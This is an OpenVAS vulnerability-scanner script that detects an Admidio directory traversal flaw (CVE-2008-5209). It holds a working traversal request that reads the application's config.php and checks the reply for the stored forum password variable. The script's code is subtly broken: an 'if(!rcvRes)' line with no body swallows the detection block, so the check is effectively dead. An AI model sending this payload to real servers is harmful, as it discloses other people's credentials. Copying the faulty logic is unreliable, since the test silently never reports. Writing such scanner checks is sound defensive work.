###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_admidio_remote_dir_trvsl_vuln.nasl 14240 2019-03-17 15:50:45Z cfischer $
#
# Admidio get_file.php Remote File Disclosure Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2008 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800309");
  script_version("$Revision: 14240 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-17 16:50:45 +0100 (Sun, 17 Mar 2019) $");
  script_tag(name:"creation_date", value:"2008-12-01 15:31:19 +0100 (Mon, 01 Dec 2008)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2008-5209");
  script_bugtraq_id(29127);
  script_name("Admidio get_file.php Remote File Disclosure Vulnerability");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/5575");
  script_xref(name:"URL", value:"http://www.admidio.org/forum/viewtopic.php?t=1180");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2008 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation could allow attacker to view local files in the
  context of the webserver process.");
  script_tag(name:"affected", value:"Admidio Version 1.4.8 and prior.");
  script_tag(name:"insight", value:"The flaw is due to file parameter in modules/download/get_file.php
  which is not properly sanitized before returning to the user.");
  script_tag(name:"solution", value:"Upgrade to Version 1.4.9 or later.");
  script_tag(name:"summary", value:"This host is running Admidio and is prone to Directory Traversal
  Vulnerability.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

foreach path (make_list_unique("/admidio", cgi_dirs(port:port)))
{

  if( path == "/" ) path = "";

  rcvRes = http_get_cache(item:string(path, "/adm_program/index.php"), port:port);
  if(!rcvRes)

  if("Admidio Team" >< rcvRes)
  {
    dirTra = "/adm_program/modules/download/get_file.php?folder=&file=../../adm_config/config.php&default_folder=";
    sndReq = http_get(item:string(path, dirTra), port:port);
    rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);
    if(!rcvRes)
      continue;

    if('Module-Owner' >< rcvRes && '$g_forum_pw' >< rcvRes){
      security_message(port);
      exit(0);
    }
  }
}

exit(99);